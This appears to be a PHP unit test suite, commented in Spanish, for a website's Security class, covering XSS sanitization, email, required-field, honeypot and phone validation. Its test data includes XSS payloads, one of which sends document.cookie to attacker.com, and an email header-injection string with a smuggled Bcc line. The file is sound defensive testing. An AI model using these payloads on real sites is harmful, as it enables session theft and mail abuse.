<?php
/**
 * PMO SOLUTIONS - Unit Test Suite: Security & Hardening
 * 
 * Archivo de pruebas unitarias para validar las funciones críticas de
 * sanitización, mitigación XSS y validación de formularios en Security.php.
 *
 * Ejecución:
 * php backend/tests/SecurityTest.php
 */

require_once __DIR__ . '/../Security.php';

class SecurityTest {

    private int $passed = 0;
    private int $failed = 0;
    private array $errors = [];

    /**
     * Ejecuta toda la suite de pruebas unitarias
     */
    public function runAll(): void {
        $this->printHeader("INICIANDO SUITE DE PRUEBAS UNITARIAS: SECURITY & HARDENING");

        $this->testSanitizationAgainstXSS();
        $this->testEmailValidation();
        $this->testRequiredFieldsValidation();
        $this->testPhoneValidationAndHoneypot();

        $this->printSummary();
    }

    /**
     * CASO 1: Sanitización y Neutralización de Ataques XSS
     * 
     * Valida que las etiquetas <script>, eventos inline (onerror, onload)
     * y caracteres especiales (<, >, ", ') sean neutralizados y limpiados.
     */
    public function testSanitizationAgainstXSS(): void {
        $this->printSection("1. Pruebas de Sanitización de Entradas y Mitigación XSS");

        // Payload 1: Inyección de script clásica
        $xssPayload1 = "<script>alert('XSS Attack');</script>Hola PMO";
        $clean1 = Security::cleanString($xssPayload1);
        $this->assert(
            strpos($clean1, '<script>') === false && strpos($clean1, 'alert') !== false,
            "Eliminación de etiquetas <script> en cleanString()",
            "Entrada: {$xssPayload1} | Salida: {$clean1}"
        );

        // Payload 2: Inyección mediante etiquetas img con onerror
        $xssPayload2 = '<img src="x" onerror="document.location=\'http://attacker.com/steal?cookie=\'+document.cookie">';
        $clean2 = Security::cleanString($xssPayload2);
        $this->assert(
            strpos($clean2, '<img') === false && strpos($clean2, 'onerror') === false,
            "Eliminación de etiquetas <img> y vectores de ataque DOM en cleanString()",
            "Entrada: {$xssPayload2} | Salida: {$clean2}"
        );

        // Payload 3: Sanitización multilínea y preservación de formato seguro
        $xssPayload3 = "Mensaje legítimo\n<iframe src=\"evil.com\"></iframe>\nLínea 2 con caracteres & \" '";
        $clean3 = Security::cleanMultiline($xssPayload3);
        $this->assert(
            strpos($clean3, '<iframe') === false && strpos($clean3, '&amp;') !== false,
            "Limpieza de iframes y escape de caracteres HTML en cleanMultiline()",
            "Entrada: [Payload Multilínea] | Salida: {$clean3}"
        );

        // Payload 4: Truncado de longitud máxima por seguridad (prevenir DoS por buffer payload)
        $longPayload = str_repeat('A', 300);
        $clean4 = Security::cleanString($longPayload, 50);
        $this->assert(
            mb_strlen($clean4, 'UTF-8') === 50,
            "Truncado estricto al límite configurado (50 caracteres) para prevenir desbordamientos",
            "Longitud final: " . mb_strlen($clean4, 'UTF-8')
        );
    }

    /**
     * CASO 2: Validación de Formato de Correos Electrónicos
     * 
     * Valida que correos sintácticamente correctos retornen TRUE
     * y formatos inválidos o vectores de Header Injection retornen FALSE.
     */
    public function testEmailValidation(): void {
        $this->printSection("2. Pruebas de Validación de Formato de Correo Electrónico");

        $validEmails = [
            'contacto@pmo-solutions.com',
            'gerencia.proyectos@constructora.com.pe',
            'ing.luis.ruiz+certificaciones@empresa.org',
            'cliente_nec4@gobierno.gob.pe'
        ];

        foreach ($validEmails as $email) {
            $isValid = Security::validateEmail($email);
            $this->assert(
                $isValid === true,
                "Aceptación de correo corporativo legítimo: '{$email}'",
                "Resultado esperado: true, obtenido: " . var_export($isValid, true)
            );
        }

        $invalidEmails = [
            'correo_sin_arroba.com',
            'usuario@',
            '@dominio.com',
            'usuario@dominio',
            'usuario@.com',
            'usuario@dominio..com',
            '',
            '   ',
            "admin@empresa.com\r\nBcc:spam@malicioso.com", // Intento de Email Header Injection
            str_repeat('a', 151) . '@dominio.com'           // Exceso de longitud máxima (> 150 chars)
        ];

        foreach ($invalidEmails as $email) {
            $isValid = Security::validateEmail($email);
            $this->assert(
                $isValid === false,
                "Rechazo de correo inválido o vector malicioso: '" . addcslashes($email, "\r\n") . "'",
                "Resultado esperado: false, obtenido: " . var_export($isValid, true)
            );
        }
    }

    /**
     * CASO 3: Validación de Campos Obligatorios
     * 
     * Valida que entradas vacías, nulas o con solo espacios en blanco
     * sean detectadas y devuelvan los mensajes de error correspondientes.
     */
    public function testRequiredFieldsValidation(): void {
        $this->printSection("3. Pruebas de Validación de Campos Obligatorios");

        $requiredRules = [
            'nombre'   => 'Nombre Completo',
            'email'    => 'Correo Electrónico',
            'telefono' => 'Teléfono',
            'mensaje'  => 'Mensaje'
        ];

        // Escenario A: Todos los campos presentes y válidos
        $validData = [
            'nombre'   => 'Ing. Carlos Mendoza',
            'email'    => 'carlos.mendoza@constructora.pe',
            'telefono' => '+51 987654321',
            'mensaje'  => 'Solicito información para el programa de formación NEC4.'
        ];
        $errorsA = Security::validateRequired($validData, $requiredRules);
        $this->assert(
            empty($errorsA),
            "Pasa exitosamente cuando todos los campos requeridos están completos",
            "Errores encontrados: " . json_encode($errorsA)
        );

        // Escenario B: Campos vacíos o no enviados
        $missingData = [
            'nombre' => 'Carlos Mendoza'
            // Faltan email, telefono, mensaje
        ];
        $errorsB = Security::validateRequired($missingData, $requiredRules);
        $this->assert(
            count($errorsB) === 3 && isset($errorsB['email'], $errorsB['telefono'], $errorsB['mensaje']),
            "Rechaza y genera error en campos omitidos (email, teléfono, mensaje)",
            "Campos detectados como faltantes: " . implode(', ', array_keys($errorsB))
        );

        // Escenario C: Campos que solo contienen espacios en blanco (Bypass Bypass Test)
        $whitespaceData = [
            'nombre'   => '   ',
            'email'    => '       ',
            'telefono' => "\t  \n ",
            'mensaje'  => '    '
        ];
        $errorsC = Security::validateRequired($whitespaceData, $requiredRules);
        $this->assert(
            count($errorsC) === 4,
            "Rechaza campos que contienen únicamente espacios en blanco o tabuladores",
            "Total de campos con espacios rechazados: " . count($errorsC) . " de 4"
        );
    }

    /**
     * CASO 4: Pruebas Adicionales de Seguridad (Honeypot Anti-Spam & Teléfonos)
     */
    public function testPhoneValidationAndHoneypot(): void {
        $this->printSection("4. Pruebas Complementarias: Honeypot Anti-Bot y Teléfono");

        // Honeypot: Humano (campo trampa vacío) vs Bot (campo trampa lleno)
        $humanPost = ['nombre' => 'Usuario Real', 'website_hp' => ''];
        $botPost   = ['nombre' => 'Spam Bot', 'website_hp' => 'http://viagra-spam-link.ru'];

        $this->assert(
            Security::checkHoneypot($humanPost) === true,
            "Honeypot: Acepta formulario legítimo de usuario (campo trampa 'website_hp' vacío)"
        );

        $this->assert(
            Security::checkHoneypot($botPost) === false,
            "Honeypot: Bloquea automáticamente formulario completado por bot de spam"
        );

        // Validación de Teléfono
        $this->assert(
            Security::validatePhone('+51 944 276 649') === true,
            "Validación de teléfono internacional con formato (+51 944 276 649)"
        );

        $this->assert(
            Security::validatePhone('123') === false,
            "Rechazo de número de teléfono con longitud insuficiente (< 6 dígitos)"
        );
    }

    /**
     * Helper de Aserción
     */
    private function assert(bool $condition, string $testName, string $details = ''): void {
        if ($condition) {
            $this->passed++;
            echo "  \033[32m✔ [PASS]\033[0m {$testName}\n";
        } else {
            $this->failed++;
            $msg = "  \033[31m✖ [FAIL]\033[0m {$testName}";
            if ($details) {
                $msg .= " -> \033[33m{$details}\033[0m";
            }
            echo "{$msg}\n";
            $this->errors[] = $testName;
        }
    }

    private function printHeader(string $title): void {
        echo "\n======================================================================\n";
        echo " {$title}\n";
        echo "======================================================================\n";
    }

    private function printSection(string $title): void {
        echo "\n--- {$title} ---\n";
    }

    private function printSummary(): void {
        $total = $this->passed + $this->failed;
        echo "\n======================================================================\n";
        echo " RESUMEN DE RESULTADOS DE PRUEBAS\n";
        echo "======================================================================\n";
        echo " Total de pruebas ejecutadas: {$total}\n";
        echo " Pruebas exitosas (PASS)    : \033[32m{$this->passed}\033[0m\n";
        echo " Pruebas fallidas (FAIL)    : " . ($this->failed > 0 ? "\033[31m{$this->failed}\033[0m" : "\033[32m0\033[0m") . "\n";
        
        if ($this->failed === 0) {
            echo "\n \033[32m✓ TODAS LAS PRUEBAS DE SEGURIDAD Y VALIDACIÓN PASARON SATISFACTORIAMENTE.\033[0m\n\n";
        } else {
            echo "\n \033[31m✗ SE DETECTARON FALLOS EN LAS SIGUIENTES PRUEBAS:\033[0m\n";
            foreach ($this->errors as $err) {
                echo "   - {$err}\n";
            }
            echo "\n";
        }
    }
}

// Auto-ejecución si se corre desde línea de comandos
if (php_sapi_name() === 'cli' || !isset($_SERVER['REQUEST_METHOD'])) {
    $test = new SecurityTest();
    $test->runAll();
}

